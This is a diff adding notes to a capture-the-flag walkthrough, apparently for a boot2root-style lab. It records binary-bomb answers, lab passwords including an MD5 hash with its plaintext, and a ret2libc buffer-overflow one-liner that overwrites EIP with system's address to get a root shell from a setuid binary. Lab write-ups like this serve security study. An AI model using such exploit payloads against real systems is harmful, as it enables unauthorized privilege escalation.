@@ -182,3 +182,35 @@ converted to ints, the linked list looks like :
 253 -> 725 -> 301 -> 997 -> 212 -> 432
 
 The phase waits for 6 ints input and first checks that there is no duplicates and that all numbers are between 1 and 6
+
+
+now I got it, it takes ths input then changes the linked list in the order of the variables we give it then checks that it is sorted in reverse
+
+so we need to take the highest to lowest indexes ie
+
+4 2 6 3 1 5
+
+now we have 
+
+Public speaking is very easy.
+1 2 6 24 120 720
+1 b 214
+9
+opekmq
+4 2 6 3 1 5
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+we have access to thor
+
+in thor home we get a turtle script, run it with python turtle module with a little parsing and we have access to zaz
+
+(password is SLASH in md5 = 646da671ca01bb5d84dbb5fb2238dc8e)
+
+now we have a binary that is chown by root and that we can exploit easily byt overriding eip with system placing /bin/sh in the stack before, luckily /bin/sh is already in the stack in SHELL env variable
+
+./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\x90' * 4 + '\x58\xcc\xf8\xb7')"`
+
+where 0xb7e6b060 is the address of system and 0xb7f8cc58 is the address of the env variable SHELL
+
+and we are root
+
